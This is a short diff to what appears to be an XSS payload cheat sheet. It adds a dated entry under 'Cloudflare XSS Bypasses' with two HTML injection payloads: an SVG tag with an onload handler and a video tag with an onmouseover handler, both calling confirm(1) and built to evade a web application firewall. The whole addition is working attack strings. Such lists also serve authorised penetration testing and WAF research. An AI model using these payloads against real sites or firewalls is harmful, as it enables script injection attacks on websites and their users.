@@ -1082,6 +1082,13 @@ Works for CSP like `script-src 'self' data:`
 
 ### Cloudflare XSS Bypasses by [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)
 
+#### 25st January 2021
+
+```html
+<svg/onrandom=random onload=confirm(1)>
+<video onnull=null onmouseover=confirm(1)>
+```
+
 #### 21st April 2020
 
 ```html
